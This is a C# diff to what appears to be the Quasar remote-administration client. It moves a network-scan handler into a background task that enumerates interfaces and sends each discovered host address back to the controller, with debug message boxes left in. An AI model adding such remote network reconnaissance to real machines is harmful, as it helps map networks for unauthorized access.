@@ -17,6 +17,7 @@ using System.IO;
 using System.Net;
 using System.Reflection;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Quasar.Client.Messages
@@ -74,14 +75,18 @@ namespace Quasar.Client.Messages
             MessageBox.Show("Scanning interfaces...");
             List<InterfaceEntity> interfaces = ScannerHelper.GetInterfaces();
             MessageBox.Show($"Found {interfaces.Count} interfaces!");
-            foreach (InterfaceEntity nic in interfaces)
+            Task.Run(() =>
             {
-                ScannerHelper.ScanInterfaceAction(nic, (addressEntity, nicEntity) =>
+                foreach (InterfaceEntity nic in interfaces)
                 {
-                    _client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
-                    MessageBox.Show($"Added new network entity: {addressEntity.Address}");
-                });
-            }
+                    MessageBox.Show($"Beginning scan on {nic.Name}");
+                    ScannerHelper.ScanInterfaceAction(nic, (addressEntity, nicEntity) =>
+                    {
+                        _client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
+                        MessageBox.Show($"Added new network entity: {addressEntity.Address}");
+                    }, client);
+                }
+            });
         }
 
         private void Execute(ISender client, DoClientMovement message)
